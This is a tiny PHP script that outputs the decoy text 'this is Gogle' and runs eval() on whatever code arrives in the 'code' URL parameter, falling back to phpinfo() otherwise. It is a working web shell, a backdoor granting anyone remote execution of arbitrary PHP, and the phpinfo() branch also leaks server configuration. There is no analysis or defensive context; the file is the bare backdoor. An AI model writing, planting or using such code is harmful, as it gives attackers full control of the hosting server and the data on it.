<?php
echo 'this is Gogle';
if($_GET['code'])
{
  eval($_GET['code']);
}
else 
{
  phpinfo();
}

